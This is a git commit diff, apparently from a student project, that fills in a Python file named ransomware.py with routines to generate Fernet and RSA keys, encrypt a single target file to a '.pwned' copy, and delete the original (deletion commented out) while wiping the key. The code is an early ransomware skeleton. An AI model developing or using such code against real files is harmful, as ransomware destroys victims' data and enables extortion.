2292ee11ad8b80db5d22fb784f0875c3eaee3826
colinChamp <colin.seiler@mymail.champlain.edu>
2021-02-23 11:12:30 -0500

    Basic file encryption and deletion added

--- ransomware.py
+++ ransomware.py
@@ -1,29 +1,68 @@
+#Import for symmetric encryption
+from cryptography.fernet import Fernet
+
+#Import for asymmetric encryption
+import rsa
+
+#Imports for file deletion
+import os
+
 # Generates encryption keys
 def keys():
-    print("Key generated")
-    return
+    symKey = Fernet.generate_key()
+    asymPubKey, asymPrivKey = rsa.newkeys(512)
+
+    #Prints keys for debugging purposes
+    print("symKey:",symKey,"\nasymPubKey:",asymPubKey,"\nasymPrivKey:",asymPrivKey)
+
+    print("Keys generated")
+    return symKey
 
 # Loads files to be encrypted
 def targets():
+
+    #Opens target file for encryption
+    uf = open("target.txt", "r")
+    unencryptedFile = uf.read()
+    uf.close()
+
     print("Files loaded")
-    return
+    return unencryptedFile
 
 # Encrypts loaded files
-def encrypt():
+def encrypt(symKey, unencryptedFile):
+
+    #Assign symKey to fernet
+    fernet = Fernet(symKey)
+
+    #Encrypt and save the loaded file
+    encryptedFile = fernet.encrypt(unencryptedFile.encode())
+    ef = open("target.pwned", "x")
+    ef.write(str(encryptedFile))
+    ef.close()
+
+    #Prints the unencryped and encrypted files for debugging purposes
+    print("Printing unencrypted and encrypted file\n\n",unencryptedFile,encryptedFile,"\n")
+
     print("Files encrypted")
     return
 
 # Deletes old files and clears encryption key from memory
-def nuke():
+def nuke(symKey):
+    
+    #file deletion, commented for debugging purposes
+    #os.remove("target.txt")
     print("Old files deleted")
+
+    symKey = ""
     print("Key wiped")
-    return
+    return symKey
     
 
 # Main
 print("Program start")
-keys()
-targets()
-encrypt()
-nuke()
+symKey = keys()
+unencryptedFile = targets()
+encrypt(symKey, unencryptedFile)
+symKey = nuke(symKey)
 print("Program done")
